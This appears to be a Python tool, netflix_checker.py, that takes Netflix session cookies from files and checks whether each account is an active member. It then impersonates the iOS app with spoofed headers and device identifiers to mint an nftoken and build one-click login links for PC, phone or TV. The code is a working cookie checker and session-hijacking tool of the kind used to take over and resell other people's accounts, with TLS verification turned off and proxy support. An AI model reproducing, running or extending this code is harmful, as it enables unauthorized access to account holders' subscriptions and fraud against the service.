# netflix_checker.py
import html
import re
import requests
from collections import OrderedDict
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Cookie names that indicate a valid Netflix session
NETFLIX_COOKIE_NAMES = {
    'thx_guid', 'tmx_guid', 'nfvdid', 'NetflixId',
    'SecureNetflixId', 'OptanonConsent',
    'netflix-sans-bold-3-loaded', 'netflix-sans-normal-3-loaded'
}

LOGIN_DEVICES = ("pc", "phone", "tv")

LOGIN_LINK_TEMPLATES = {
    "pc": "https://netflix.com/?nftoken={token}",
    "phone": "https://netflix.com/unsupported?nftoken={token}",
    "tv": "https://netflix.com/tv2?nftoken={token}",
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"')
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def parse_cookie_string(cookie_str: str) -> OrderedDict:
    """Parse 'key1=value1; key2=value2; ...' into an OrderedDict."""
    cookies = OrderedDict()
    for part in cookie_str.split(';'):
        part = part.strip()
        if not part or '=' not in part:
            continue
        key, val = part.split('=', 1)
        cookies[key.strip()] = val.strip()
    return cookies


def create_nftoken(cookie_dict, attempts=3, proxy=None):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, None

    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"

    for _ in range(attempts):
        try:
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                proxies=proxy,
                verify=False,
            )
            if response.status_code != 200:
                continue
            data = response.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = decode_netflix_value(token_data.get("token"))
            expires = token_data.get("expires")
            if token:
                if isinstance(expires, int) and len(str(expires)) == 13:
                    expires //= 1000
                return token, expires
        except Exception:
            continue
    return None, None


def generate_nftoken(cookies_dict: dict) -> str | None:
    """Obtain an nftoken from the given cookies using the iOS API."""
    token, _ = create_nftoken(cookies_dict, attempts=3)
    return token


def build_login_link(token: str, device: str = "pc") -> str:
    template = LOGIN_LINK_TEMPLATES.get(device, LOGIN_LINK_TEMPLATES["pc"])
    return template.format(token=token)


def build_all_login_links(token: str) -> dict[str, str]:
    return {device: build_login_link(token, device) for device in LOGIN_DEVICES}


def extract_cookies_dict(file_content: str) -> OrderedDict:
    """
    Extract Netflix cookies from file content (Netscape + inline formats).
    Returns an OrderedDict of cookie name → value.
    """
    cookies = OrderedDict()

    # 1. Netscape format lines starting with .netflix.com
    for line in file_content.splitlines():
        line = line.strip()
        if line.startswith('.netflix.com'):
            parts = line.split()
            if len(parts) >= 7:
                name, value = parts[5], parts[6]
                if name in NETFLIX_COOKIE_NAMES or name.startswith('netflix-sans'):
                    cookies[name] = value

    # 2. Regex for known cookie names in the whole text
    for cookie_name in NETFLIX_COOKIE_NAMES:
        pattern = rf'\b{re.escape(cookie_name)}\s*=\s*([^;\n]+)'
        matches = re.findall(pattern, file_content, re.IGNORECASE)
        if matches:
            cookies[cookie_name] = matches[-1].strip()

    # 3. Generic fallback for any Netflix-ish key
    generic_pattern = r'\b([a-zA-Z0-9_-]+)=([^;\n]+)'
    for match in re.finditer(generic_pattern, file_content):
        name, value = match.group(1), match.group(2).strip()
        if (name in NETFLIX_COOKIE_NAMES or
            name.startswith('netflix') or
            name.endswith('Guid') or
            name in ('OptanonConsent', 'nfvdid')):
            cookies[name] = value

    # Sanity check – remove overly long values
    clean = OrderedDict()
    for k, v in cookies.items():
        if v and len(v) < 5000:
            clean[k] = v
    return clean


def check_cookie_file(file_path: str, device: str = "pc") -> str | None:
    """
    Main entry point: read a cookie file, validate cookies, generate nftoken.
    Returns the login URL for the requested device if successful, else None.
    """
    if device not in LOGIN_DEVICES:
        device = "pc"

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception:
        return None

    if not content:
        return None

    cookies_dict = extract_cookies_dict(content)
    if not cookies_dict or 'NetflixId' not in cookies_dict:
        return None

    # Validate membership
    session = requests.Session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value, domain='.netflix.com', path='/')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Pragma': 'no-cache',
    }
    try:
        resp = session.get('https://www.netflix.com/account/membership',
                           headers=headers, timeout=20, allow_redirects=True)
    except Exception:
        return None

    if 'login' in resp.url.lower():
        return None
    if '"membershipStatus":"CURRENT_MEMBER"' not in resp.text:
        return None

    nftoken, _ = create_nftoken(cookies_dict, attempts=3)
    if not nftoken:
        return None

    return build_login_link(nftoken, device)
